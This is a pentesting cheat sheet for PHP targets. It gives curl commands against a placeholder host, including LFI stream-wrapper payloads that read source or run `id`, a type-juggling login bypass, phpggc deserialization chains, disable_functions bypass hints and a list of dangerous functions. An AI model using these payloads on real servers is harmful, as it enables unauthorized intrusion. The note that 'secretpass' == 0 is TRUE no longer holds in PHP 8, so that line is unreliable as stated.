# PHP

**What it is:** The most common server-side scripting language on the web. Powers WordPress, Drupal, Joomla, and countless custom apps. Misconfigurations and dangerous functions are the main attack vectors.

**Vuln research:**
- [PHP CVEs — CVE Details](https://www.cvedetails.com/product/128/PHP-PHP.html)
- [SearchSploit: `searchsploit php`](https://www.exploit-db.com/search?q=php)
- [HackTricks — PHP Tricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html)

---

### Identify PHP version

Check headers, phpinfo, and error pages

```bash
curl -sI http://$IP/ | grep -i "x-powered-by"
curl http://$IP/phpinfo.php
curl http://$IP/info.php
```

---

### PHP wrapper attacks (LFI)

Use PHP stream wrappers to read source code or achieve RCE

```bash
# Read source code as base64:
curl "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=config"

# RCE via data wrapper:
curl "http://$IP/index.php?page=data://text/plain,<?php system('id'); ?>"

# RCE via input wrapper (POST body becomes code):
curl -X POST "http://$IP/index.php?page=php://input" -d "<?php system('id'); ?>"

# Expect wrapper:
curl "http://$IP/index.php?page=expect://id"
```

---

### PHP type juggling

Loose comparison (==) bypass — Authentication bypass

```bash
# If login uses: if ($password == $user_input)
# Send password as integer 0:
curl -X POST http://$IP/login.php -d "user=admin&password=0"
# In PHP: "secretpass" == 0 evaluates to TRUE (loose comparison)
```

---

### PHP deserialization

Unserialize() with user input — Object injection to RCE

```bash
# Look for: unserialize($_GET['data']) or similar
# Craft serialized PHP object with magic methods (__wakeup, __destruct)
# Tools: phpggc for generating payloads
phpggc -l                    # List available chains
phpggc Laravel/RCE1 system id  # Generate payload
```

---

### PHP disable_functions bypass

If dangerous functions are disabled — Techniques to bypass

```bash
# Check what's disabled:
curl http://$IP/phpinfo.php | grep disable_functions

# Bypass methods:
# 1. LD_PRELOAD + mail() / putenv()
# 2. FFI (PHP 7.4+)
# 3. pcntl_exec if available
# 4. Chankro tool for automated bypass
```

---

### Dangerous PHP functions

Functions that enable RCE — Look for these in source code

```
system()         exec()           shell_exec()
passthru()       popen()          proc_open()
pcntl_exec()     eval()           assert()
preg_replace()   (with /e flag)   create_function()
include()        require()        file_get_contents()
```

---
